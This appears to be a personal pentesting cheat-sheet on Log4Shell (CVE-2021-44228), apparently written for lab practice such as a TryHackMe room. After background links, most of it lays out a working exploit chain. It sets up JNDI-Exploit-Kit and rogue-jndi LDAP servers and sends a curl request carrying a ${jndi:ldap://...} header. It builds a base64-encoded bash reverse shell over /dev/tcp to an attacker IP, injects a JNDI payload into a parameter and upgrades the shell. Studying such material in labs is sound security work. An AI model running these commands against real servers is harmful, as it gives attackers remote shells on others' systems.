# Log4Shell
## Introduction

For amazing visual and practical explanation of the affect on a MineCraft server please watch the [John Hammond - CVE-2021-44228 - Log4j](https://www.youtube.com/watch?v=7qoPDq41xhQ) YouTube video. This vulnerability was possible one of most severe 0days that could have been in use for over ten years and have wide application outside of hacking MineCraft servers. [Log4j](https://en.wikipedia.org/wiki/Log4j) is a Java Logging utility that it is used in web servers and application that use Java may use this logging utility and therefore probably therefore the worst 0day for the longest possible time (since 2014) that was only publicly disclosed and patched in 2021 named [Log4Shell](https://en.wikipedia.org/wiki/Log4Shell). An really interesting example for those that are probably reading this is [Kosmer's PoC](https://github.com/kozmer/log4j-shell-poc) showcasing the exploitation of Ghidra - [[Ghidra-Cheatsheet]]

Additional reading materials
- [Lunasec.io blog post on Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
- [CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
- https://apkash8.medium.com/exploiting-the-log4j-vulnerability-cve-2021-44228-4b8d9d5133f6

#### JDNI-Injection-Exploit

 [welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit) *"JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability, like Jackson, Fastjson, etc)"* and pimps's fork [https://github.com/pimps/JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit) *"JNDI-Exploitation-Kit（A modified version of the great JNDI-Injection-Exploit created by @welk1n. This tool can be used to start an HTTP Server, RMI Server and LDAP Server to exploit java web apps vulnerable to JNDI Injection）"*

```bash
git clone https://github.com/pimps/JNDI-Exploit-Kit.git
cd JNDI-Exploit-Kit
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "$yourLdapServer$:1389" -C "echo $base64ReverseShellage | base64 -d | bash"
curl http://poorserver/logs/log4j -H "X-API-Version: ${jndi:ldap://10.10.10.10:1389/$payloadNameFromJDNIexploitkit}"
```

#### Rogue-JNDI
```bash
apt update
apt install openjdk-11-jdk -y
apt-get install maven
mvn -v
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi  
mvn package
```

As of 2024 - tooling compatibility install Java 11..similarly as for `ysoserial`, etc
```bash
sudo apt-get install openjdk-11-jdk
```

#### Pass the payload

Use the `rogue-jdni` server to pass a payload. First base64 encode the reverse shell payload.
```bash
echo 'bash -c bash -i >&/dev/tcp/$IP/$PORT 0>&1' | base64
```
Then within the `rogue-jndi` directory.
```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo, $ENCODEDPAYLOAD} | {base64,-d}|{bash,-i}" --hostname "$IP"
```

Post response set "vulnerable parametre to:
Note: port 1389 is the rogue-jndi server
```json
{
	vuln:"${jndi:ldap://$IP:1389/o=tomcat}",
}
```
Upgrade the terminal shell:
```bash
script /dev/null -c bash
```

## References

[THM Solar Room](https://tryhackme.com/room/solar)
[John Hammond - CVE-2021-44228 - Log4j](https://www.youtube.com/watch?v=7qoPDq41xhQ)
[Wikipedia Log4j](https://en.wikipedia.org/wiki/Log4j)
[Wikipedia Log4Shell](https://en.wikipedia.org/wiki/Log4Shell)
[Kosmer's PoC](https://github.com/kozmer/log4j-shell-poc)
[Lunasec.io blog post on Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/)
[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
[CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
[welk1n/JNDI-Injection-Exploit - NOT TESTED](https://github.com/welk1n/JNDI-Injection-Exploit) 
[https://github.com/pimps/JNDI-Exploit-Kit - TESTED](https://github.com/pimps/JNDI-Exploit-Kit) 